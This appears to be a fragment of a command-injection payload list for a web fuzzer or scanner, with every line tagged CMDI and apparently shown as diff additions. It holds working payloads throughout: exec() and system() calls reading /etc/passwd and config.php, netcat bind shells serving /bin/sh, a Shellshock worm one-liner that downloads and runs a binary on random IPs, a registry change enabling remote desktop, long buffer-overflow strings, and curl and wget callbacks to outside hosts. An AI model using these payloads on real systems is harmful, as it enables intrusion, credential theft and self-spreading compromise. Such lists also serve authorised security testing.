XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+exec('ls'),CMDI
+exec('ls'),CMDI
+exec('ls'),CMDI
+exec('ls'),CMDI
+exec('pwd'),CMDI
+exec('pwd'),CMDI
+exec('pwd'),CMDI
+exec('pwd'),CMDI
+exec('pwd');,CMDI
+exec('pwd');,CMDI
+exec('pwd');,CMDI
+exec('pwd');,CMDI
+exec('sleep 5'),CMDI
+exec('sleep 5'),CMDI
+exec('sleep 5'),CMDI
+exec('sleep 5'),CMDI
+exec('sleep 5');,CMDI
+exec('sleep 5');,CMDI
+exec('sleep 5');,CMDI
+exec('sleep 5');,CMDI
+exec('whoami'),CMDI
+exec('whoami'),CMDI
+exec('whoami'),CMDI
+exec('whoami'),CMDI
+exec('whoami');,CMDI
+exec('whoami');,CMDI
+exec('whoami');,CMDI
+exec('whoami');,CMDI
+FAIL||{cmd},CMDI
+FAIL||CMD=$'{cmd}';$CMD,CMDI
+"FAIL||CMD=$""{cmd}"";$CMD",CMDI
+FAIL||CMD=$\'{cmd}\';$CMD,CMDI
+File:///b'/../../../../file',CMDI
+file:///etc/hosts',CMDI
+"foo='() { echo ""hi mom""; }' bash -c 'foo'",CMDI
+http://localhost/aa.txt',CMDI
+"Kernel.exec(""ls -al /"")",CMDI
+ls -l /etc/,CMDI
+ls -l /etc/,CMDI
+ls -l /etc/,CMDI
+ls -l /etc/,CMDI
+ls -l /home/*,CMDI
+ls -l /home/*,CMDI
+ls -l /home/*,CMDI
+ls -l /home/*,CMDI
+ls -l /tmp,CMDI
+ls -l /tmp,CMDI
+ls -l /tmp,CMDI
+ls -l /tmp,CMDI
+ls -l /var/www/*,CMDI
+ls -l /var/www/*,CMDI
+ls -l /var/www/*,CMDI
+ls -l /var/www/*,CMDI
+ls -lh /etc/,CMDI
+ls -lh /etc/,CMDI
+ls -lh /etc/,CMDI
+ls -lh /etc/,CMDI
+nc -lvvp 4444 -e /bin/sh,CMDI
+nc -lvvp 4444 -e /bin/sh,CMDI
+nc -lvvp 4444 -e /bin/sh,CMDI
+nc -lvvp 4444 -e /bin/sh,CMDI
+nc -lvvp 4445 -e /bin/sh &,CMDI
+nc -lvvp 4445 -e /bin/sh &,CMDI
+nc -lvvp 4445 -e /bin/sh &,CMDI
+nc -lvvp 4445 -e /bin/sh &,CMDI
+nc -lvvp 4446 -e /bin/sh|,CMDI
+nc -lvvp 4446 -e /bin/sh|,CMDI
+nc -lvvp 4446 -e /bin/sh|,CMDI
+nc -lvvp 4446 -e /bin/sh|,CMDI
+nc -lvvp 4447 -e /bin/sh;,CMDI
+nc -lvvp 4447 -e /bin/sh;,CMDI
+nc -lvvp 4447 -e /bin/sh;,CMDI
+nc -lvvp 4447 -e /bin/sh;,CMDI
+nc -lvvp 4448 -e /bin/sh&,CMDI
+nc -lvvp 4448 -e /bin/sh&,CMDI
+nc -lvvp 4448 -e /bin/sh&,CMDI
+nc -lvvp 4448 -e /bin/sh&,CMDI
+"perl -e 'print ""X""x1024'",CMDI
+"perl -e 'print ""X""x1024'",CMDI
+"perl -e 'print ""X""x1024'",CMDI
+"perl -e 'print ""X""x1024'",CMDI
+"perl -e 'print ""X""x16384'",CMDI
+"perl -e 'print ""X""x16384'",CMDI
+"perl -e 'print ""X""x16384'",CMDI
+"perl -e 'print ""X""x16384'",CMDI
+"perl -e 'print ""X""x2048'",CMDI
+"perl -e 'print ""X""x2048'",CMDI
+"perl -e 'print ""X""x2048'",CMDI
+"perl -e 'print ""X""x2048'",CMDI
+"perl -e 'print ""X""x4096'",CMDI
+"perl -e 'print ""X""x4096'",CMDI
+"perl -e 'print ""X""x4096'",CMDI
+"perl -e 'print ""X""x4096'",CMDI
+"perl -e 'print ""X""x8192'",CMDI
+"perl -e 'print ""X""x8192'",CMDI
+"perl -e 'print ""X""x8192'",CMDI
+"perl -e 'print ""X""x8192'",CMDI
+"perl -e 'print ""X""x81920'",CMDI
+"perl -e 'print ""X""x81920'",CMDI
+"perl -e 'print ""X""x81920'",CMDI
+"perl -e 'print ""X""x81920'",CMDI
+php://filter/read=convert.base64-encode/resource=index.php',CMDI
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+s='() { .;};wget x.x.x.x/WORM;chmod +x WORM;./WORM';while true;do wget $[RANDOM%255].$[RANDOM%255].$[RANDOM%255].$[RANDOM%255] -U'$s';done,CMDI
+strings /usr/lib/dyld | grep ^DYLD_ | sed -e 's/^/note to self: try exploiting /',CMDI
+system('cat /etc/passwd');,CMDI
+system('cat /etc/passwd');,CMDI
+system('cat /etc/passwd');,CMDI
+system('cat /etc/passwd');,CMDI
+system('cat C:\boot.ini');,CMDI
+system('cat C:\boot.ini');,CMDI
+system('cat C:\boot.ini');,CMDI
+system('cat C:\boot.ini');,CMDI
+system('cat config.php');,CMDI
+system('cat config.php');,CMDI
+system('cat config.php');,CMDI
+system('cat config.php');,CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),CMDI
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),CMDI
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
+system('ls'),CMDI
+system('ls'),CMDI
+system('ls'),CMDI
+system('ls'),CMDI
+system('pwd'),CMDI
+system('pwd'),CMDI
+system('pwd'),CMDI
+system('pwd'),CMDI
+system('pwd');,CMDI
+system('pwd');,CMDI
+system('pwd');,CMDI
+system('pwd');,CMDI
+system('sleep 5'),CMDI
+system('sleep 5'),CMDI
+system('sleep 5'),CMDI
+system('sleep 5'),CMDI
+system('sleep 5');,CMDI
+system('sleep 5');,CMDI
+system('sleep 5');,CMDI
+system('sleep 5');,CMDI
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),CMDI
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),CMDI
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),CMDI
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),CMDI
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
